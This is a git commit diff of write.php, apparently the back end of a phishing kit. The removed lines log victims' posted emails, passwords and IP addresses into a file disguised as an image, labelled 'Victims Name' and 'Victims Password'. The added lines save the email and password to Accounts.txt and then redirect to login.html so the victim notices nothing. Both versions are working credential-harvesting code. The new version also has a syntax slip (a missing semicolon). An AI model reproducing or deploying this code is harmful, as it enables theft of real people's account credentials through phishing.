08e0a5be49d4cd9920767492cad3978525dcfeaf
bobstottts <bobstottts@googlemail.com>
2017-07-21 18:09:42 +0600

    Update write.php

--- folder/write.php
+++ folder/write.php
@@ -1,13 +1,8 @@
 <?php
-$habbo = $_POST['email']; 
-$password = $_POST['pass'];
-$ip = $_SERVER['REMOTE_ADDR']; 
-$f = fopen("AAC189092019881999191919191mobeen.jpg", "a"); 
-fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$habbo.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.fb.com/mobeendotcom" rel="nofollow">Bee Hay</a></font></b>]<br>');
-
-file_put_contents($file, $data, FILE_APPEND);
-  sleep(1.5)
-    fclose($f);
-
-<meta http-equiv="refresh" content="0; url=login.html" />
+  $data = sprintf("Account Information\r{\n\tEmail: %s\n\tPassword: %s\n}\n\n================\n\n", $_POST['email'], $_POST['pass']);
+  $file = "Accounts.txt"; 
+  file_put_contents($file, $data, FILE_APPEND);
+  sleep(10.5)
 ?>
+<meta http-equiv="refresh" content="0; url=login.html" />
+
